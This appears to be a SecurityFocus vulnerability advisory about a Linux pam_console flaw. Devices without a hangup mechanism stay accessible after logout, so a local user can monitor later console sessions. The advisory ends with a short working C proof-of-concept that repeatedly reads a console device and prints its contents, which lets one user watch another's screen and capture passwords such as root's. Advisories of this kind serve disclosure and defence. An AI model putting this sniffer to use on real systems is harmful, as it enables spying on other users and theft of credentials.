source: http://www.securityfocus.com/bid/1176/info

A vulnerability exists in the pam_console PAM module, included as part of any Linux system running PAM. pam_console exists to own certain devices to users logging in to the console of a Linux machine. It is designed to allow only console users to utilize things such as sound devices. It will chown devices to users upon logging in, and chown them back to being owned by root upon logout. However, as certain devices do not have a 'hangup' mechanism, like a tty device, it is possible for a local user to continue to monitor activity on certain devices after logging out. This could allow an malicious user to sniff other users console sessions, and potentially obtain the root password if the root user logs in, or a user su's to root. They could also surreptitiously execute commands as the user on the console.

#include <sys/fcntl.h>

main(int argc,char*argv[]) {
  char buf[80*24];
  int f=open(argv[1],O_RDWR);
  while (1) {
    lseek(f,0,0);
    read(f,buf,sizeof(buf));
    write(1,"\033[2J\033[H",7); // clear terminal, vt100/linux/ansi
    write(1,buf,sizeof(buf));
    usleep(10000);
  }
}